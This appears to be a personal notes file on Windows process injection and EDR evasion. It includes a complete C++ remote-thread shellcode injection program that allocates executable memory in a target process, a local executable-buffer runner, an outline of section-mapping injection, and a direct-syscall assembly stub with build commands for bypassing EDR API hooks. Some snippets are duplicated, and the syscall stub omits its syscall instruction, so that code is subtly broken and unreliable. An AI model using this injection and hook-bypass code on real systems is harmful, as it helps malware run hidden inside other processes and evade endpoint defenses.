# Windows 
### Injection and Hijacking

### EDR
Sensor - > Userland ( collects telemetry and monitors behavior)

Driver -> Kernel ( monitor low-level operations)

Backend -> Online Infra (Where all received telementry is sent to for processing, logging and analysis)

### Terms
API calls -> High level function calls provided by window libraries
System call -> low-level interface between userland and kernel land


### Kernel Prefix
Nt -> native api -> wrapper for userland syscall for userland system services
Zw -> Kernel-mode Native API -> used also in kernel mode, may skip user-mode access checks
Ex -> Executive layer -> Core helper functions
cm -> configuration manager -> registry interaction


### IAT 
Import address table, stores address of functions imported from external DLL


### EAT
export address table, expose functions or symbols for external use

### Win APi Functions

```cpp
OpenProcess ()

VirtualAllocEx ()

WriteProcessMemory()

CreateRemoteThread()
```



### Inject thread 


```cpp
#include <windows.h>
#include <processthreadsapi.h>

int main() {

    HANDLE hProcess, hThread;
    LPVOID start_ptr;
    DWORD tid;
    size_t written;

    char shellcode[] = {

    };
    start_ptr = (LPVOID) 0x13370000;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2676);

    start_ptr = VirtualAllocEx(hProcess, start_ptr, 0x1000,  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hProcess, start_ptr, shellcode, 256, &written);

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)start_ptr, NULL, 0, &tid);

}

```


### without virtualalloc

find writeable memory, put loadlibrary , pass dll as argument and call CreateRemoteThread


```
typedef HANDLE (WINAPI *CREATEFILE2)(LPCWSTR, DWORD, DWORD, DWORD, LPCREATEFILE2_EXTENDED_PARAMETERS);

GetProcAddress(GetModuleHandleA("kernelbase"), "CreateFile2");
```




```cpp
    execMem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(execMem, code, sizeof(code));
    f = (Func)execMem;
    f(&hPipe);
```

without virtualalloc

find writeable memory, put loadlibrary , pass dll as argument and call CreateRemoteThread


```
typedef HANDLE (WINAPI *CREATEFILE2)(LPCWSTR, DWORD, DWORD, DWORD, LPCREATEFILE2_EXTENDED_PARAMETERS);

GetProcAddress(GetModuleHandleA("kernelbase"), "CreateFile2");
```




```
typedef NTSTATUS (NTAPI *NtCreateFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG
);
GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
```




```
avoiding virtual alloc 

Instead of allocating memory directly in a remote process using VirtualAllocEx, you:

- Create a memory section (like a shared memory region).

- Map that section into both your process and the target process.

- Write your payload into your local mapping.

- The payload now exists in the remote process too — because both share the same memory section.

This approach uses native NT APIs:

NtCreateSection

NtMapViewOfSection

```


## Bypassing EDR API Hooking 

### inject inline asm with naked function

    Note: When preparing for system call, windows move rcx (first arg) into r10 as rcx will be use to store the return address and r10 now represent the first argument . rax still stores the system call number


### setting up syscall
move syscall number into rax,
mov rcx into r10, putting first argument now into r10 for kernel use 
userland uses rcx

```asm
; syscall.asm

.code
public MyNakedFunction

MyNakedFunction proc
    mov r10, rcx        ; Windows x64 ABI requires syscall target in R10
    mov eax, 0c4h       ; 
    ret
MyNakedFunction endp

end
```
assemble

```
ml64 /c /Fo syscall.obj syscall.asm 
```

then in your cpp
```cpp
extern "C" int MyNakedFunction(HANDLE *); 
```

compile with 
```
cl /O2 windows.cpp syscall.obj
```
